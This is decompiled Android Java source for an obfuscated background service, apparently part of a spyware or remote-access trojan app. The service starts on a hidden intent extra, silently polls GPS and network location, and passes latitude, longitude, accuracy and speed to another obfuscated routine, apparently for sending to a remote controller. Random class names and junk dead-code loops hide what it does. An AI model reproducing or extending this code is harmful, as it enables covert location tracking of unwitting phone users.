package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import androidx.core.content.C0025a;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0047e;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11 extends Service {

    /* renamed from: b */
    public static long f362b = 5000;

    /* renamed from: c */
    public static long f363c;

    /* renamed from: d */
    public static double f364d;

    /* renamed from: e */
    public static double f365e;

    /* renamed from: f */
    public static float f366f;

    /* renamed from: g */
    public static float f367g;

    /* renamed from: h */
    public static LocationListener f368h;

    /* renamed from: i */
    public static LocationManager f369i;

    /* renamed from: a */
    private String[] f370a;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11$a */
    /* loaded from: classes.dex */
    public class C0085a implements LocationListener {
        C0085a() {
        }

        @Override // android.location.LocationListener
        public void onLocationChanged(Location location) {
            if (location != null) {
                jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f365e = location.getLongitude();
                jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f364d = location.getLatitude();
                jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f366f = location.getAccuracy();
                jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f367g = location.getSpeed();
                jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.this.m127d(jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f364d, jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f365e, jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f366f);
                if (jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f369i.isProviderEnabled("gps")) {
                    try {
                        jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f369i.removeUpdates(jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f368h);
                    } catch (Exception unused) {
                        Boolean bool = Boolean.TRUE;
                        while (bool.booleanValue()) {
                            bool = Boolean.FALSE;
                        }
                        while (bool.booleanValue()) {
                            bool = Boolean.FALSE;
                        }
                        while (bool.booleanValue()) {
                            bool = Boolean.FALSE;
                        }
                        while (bool.booleanValue()) {
                            bool = Boolean.FALSE;
                        }
                    }
                    if (C0025a.m312a(jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.this.getApplicationContext(), "android.permission.ACCESS_FINE_LOCATION") == 0 || C0025a.m312a(jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.this.getApplicationContext(), "android.permission.ACCESS_COARSE_LOCATION") == 0) {
                        jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f369i.requestLocationUpdates("gps", jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f362b, (float) jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f363c, jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.f368h);
                    }
                }
            }
        }

        @Override // android.location.LocationListener
        public void onProviderDisabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onProviderEnabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    }

    /* renamed from: b */
    private void m129b() {
        stopService(new Intent(this, jgxyvwdttxixhfjbcrgxpibnfbbwrhorlcqijclrioduzlbiag11.class));
    }

    /* renamed from: c */
    private void m128c() {
        LocationManager locationManager;
        String str;
        long j;
        long j2;
        try {
            f369i = (LocationManager) getSystemService("location");
            f368h = new C0085a();
            boolean isProviderEnabled = f369i.isProviderEnabled("network");
            boolean isProviderEnabled2 = f369i.isProviderEnabled("gps");
            if (!isProviderEnabled2 && !isProviderEnabled) {
                m129b();
                return;
            }
            if (isProviderEnabled) {
                Location lastKnownLocation = f369i.getLastKnownLocation("network");
                if (lastKnownLocation != null) {
                    f365e = lastKnownLocation.getLongitude();
                    f364d = lastKnownLocation.getLatitude();
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    f366f = lastKnownLocation.getAccuracy();
                    f367g = lastKnownLocation.getSpeed();
                    m127d(f364d, f365e, f366f);
                }
                locationManager = f369i;
                str = "network";
                j = f362b;
                j2 = f363c;
            } else if (!isProviderEnabled2) {
                return;
            } else {
                Location lastKnownLocation2 = f369i.getLastKnownLocation("gps");
                if (lastKnownLocation2 != null) {
                    f365e = lastKnownLocation2.getLongitude();
                    f364d = lastKnownLocation2.getLatitude();
                    f366f = lastKnownLocation2.getAccuracy();
                    Boolean bool2 = Boolean.TRUE;
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    f367g = lastKnownLocation2.getSpeed();
                    m127d(f364d, f365e, f366f);
                }
                locationManager = f369i;
                str = "gps";
                j = f362b;
                j2 = f363c;
            }
            locationManager.requestLocationUpdates(str, j, (float) j2, f368h);
        } catch (Exception unused) {
            f365e = 0.0d;
            f364d = 0.0d;
            m129b();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: d */
    public void m127d(double d, double d2, float f) {
        oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(this.f370a[1], (d + this.f370a[0] + d2 + this.f370a[0] + f + this.f370a[0] + ((int) f367g)).getBytes());
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onDestroy() {
        C0045d.f162C = 0;
        try {
            f369i.removeUpdates(f368h);
        } catch (Exception unused) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        String str = C0047e.f215e;
        if (intent == null || !intent.hasExtra(str)) {
            return 1;
        }
        C0045d.f188c = getApplicationContext().getResources().getString(C0116R.string.ptshblocky64);
        try {
            this.f370a = intent.getStringArrayExtra(str);
        } catch (Exception unused) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
        m128c();
        return 1;
    }
}
